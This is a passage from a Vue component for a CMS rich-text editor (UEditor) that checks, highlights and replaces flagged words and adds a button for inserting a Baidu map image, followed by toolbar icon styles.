        }).then(({ value }) => {
          editor.execCommand('xy-replace-word2', response.data, value);
        }).catch(() => {
          editor.execCommand('xy-highlight-word', response.data);
        });
      }
    })
  } else if (value == 'fallible') {
    checkFallibleWords(editor.getContentTxt()).then(response => {
      if (response.data.length == 0) {
        proxy.$modal.msgSuccess(proxy.$t('CMS.UEditor.NoFallibleWord'));
      } else {
        const str = response.data.map(item => item.w + " > " + item.r).join("<br/>");
        proxy.$confirm(str, proxy.$t('CMS.UEditor.FoundFallibleWord'), {
          confirmButtonText: proxy.$t('CMS.UEditor.ReplaceWord'),
          cancelButtonText: proxy.$t('CMS.UEditor.HighlightWord'),
          dangerouslyUseHTMLString: true,
          distinguishCancelAndClose: true
        }).then(() => {
          editor.execCommand('xy-replace-word', response.data)
        }).catch(() => {
          editor.execCommand('xy-highlight-word', response.data.map(item => item.w))
        });
      }
    })
  }
}

function handleXyWordHighlight(cmd, words) {
  const editor = window.UE.getEditor(props.editorId)
  let html = editor.getContent();
  // 先去掉可能存在的高亮标签
  html = html.replace(new RegExp("<span class=\"warning_tip\">([^<]*)</span>", "ig"), '$1');
  words.forEach(word => {
    html = html.replace(new RegExp(word, "ig"), '<span class="warning_tip">' + word + '</span>')
  })
  editor.setContent(html)
}
    
function handleXyWordReplace(cmd, list) {
  const editor = window.UE.getEditor(props.editorId)
  let html = editor.getContent();
  // 先去掉可能存在的高亮标签
  html = html.replace(new RegExp("<span class=\"warning_tip\">([^<]*)</span>", "ig"), '$1');
  list.forEach(item => {
    html = html.replace(new RegExp(item.w, "ig"), item.r)
  })
  editor.setContent(html)
}

function handleXyWordReplace2(cmd, words, replacement) {
  const editor = window.UE.getEditor(props.editorId)
  let html = editor.getContent();
  // 先去掉可能存在的高亮标签
  html = html.replace(new RegExp("<span class=\"warning_tip\">([^<]*)</span>", "ig"), '$1');
  words.forEach(word => {
    html = html.replace(new RegExp(word, "ig"), replacement)
  })
  editor.setContent(html)
}

// 插入地图
function addBaiduMapButton(editorId) {
  window.UE.registerUI('xy-baidu-map', function (editor, uiName) {
    editor.registerCommand(uiName, {
      execCommand: function(cmdName){
        editor.onBaiduMapButtonClick(cmdName);
      }
    });
    const ui = new UE.ui.Button({
      className: "edui-for-" + uiName,
      name: proxy.$t('CMS.UEditor.InsertBaiduMap'),
      title: proxy.$t('CMS.UEditor.InsertBaiduMap'),
      onclick: function() {
        editor.execCommand(uiName);
      }
    });
    return ui;
  });
}

function handleBaiduMapButtonClick(cmd, value) {
  openBaiduMapDialog.value = true
}

function handleBaiduMapDialogOk(result) {
  if (result) {
    var editor = window.UE.getEditor(props.editorId)
    editor.execCommand('inserthtml', '<img width="' + result.width + '" height="'+result.height+'" src="' + result.src + '"/>');
  }
}
</script>
<style scoped>
:deep(.edui-for-xy-resource .edui-menubutton-body .edui-icon) {
  background-image: url('./images/image.png') !important;
  /* background-size: contain; */
}
:deep(.edui-for-xy-third-video .edui-button-body .edui-icon) {
  background-image: url('./images/video.png') !important;
}
:deep(.edui-for-xy-content .edui-menubutton-body .edui-icon) {
  background-image: url('./images/content.png') !important;
}
:deep(.edui-for-xy-check-word .edui-menubutton-body .edui-icon) {
  background-image: url('./images/word.png') !important;
}
:deep(.edui-for-xy-baidu-map .edui-button-body .edui-icon) {
  background-image: url('./images/map.png') !important;
}
</style>